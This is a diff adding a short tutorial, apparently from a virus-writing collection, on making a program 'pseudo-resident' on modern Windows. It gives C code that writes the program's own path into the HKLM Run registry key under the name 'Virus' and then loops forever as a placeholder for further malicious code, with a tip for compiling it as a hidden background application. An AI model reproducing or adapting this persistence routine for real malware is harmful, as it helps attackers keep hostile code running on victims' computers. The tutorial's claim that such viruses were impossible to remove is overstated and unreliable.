@@ -1,0 +1,43 @@
+									~ Pseudo-residence in Mazda ~
+													
+													---------------------------------------------------
+													A resident program is a program that
+													remains in memory, i.e. works until
+													turning off the PC.
+													---------------------------------------------------
+
+Many memory-resident viruses were created in MS-DOS and Win9X. The most famous of these is probably CIH (aka Chernobyl).
+Simply put, such viruses were capable of running indefinitely. They infected .EXE files when they were launched, and removing them was impossible.
+The virus was more complex, but now it's impossible to implement real residency in Windows XP, 7, and newer systems. Well, that's it.
+I decided to try to simulate it...
+
+Let's draw up an algorithm of the program's actions:
+	
+	1) Add the program to startup;
+	2) Create an infinite loop and do something in it;
+
+**************************************************************************************************
+VOID StayResident()
+{
+	LPSTR VirusFileName = calloc(MAX_PATH + 1, sizeof(CHAR));
+	HKEY Key;
+	
+	GetModuleFileName(NULL, VirusFileName, (MAX_PATH + 1));
+	
+	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+		0, NULL, 0, KEY_SET_VALUE, NULL, &Key, NULL);
+	RegSetValueEx(Key, "Virus", 0, REG_SZ, VirusFileName, strlen(VirusFileName) + 1);
+	
+	RegCloseKey(Key);
+	
+	while(TRUE)
+	{
+		Sleep(1);
+		
+		// here we add our code, all sorts of if-s and so on.
+	}
+}
+**************************************************************************************************
+
+Sleep at 1 m/s is absolutely necessary to ensure that the program does not load the CPU, and to create a background application use
+The parameter is "-mwindows".
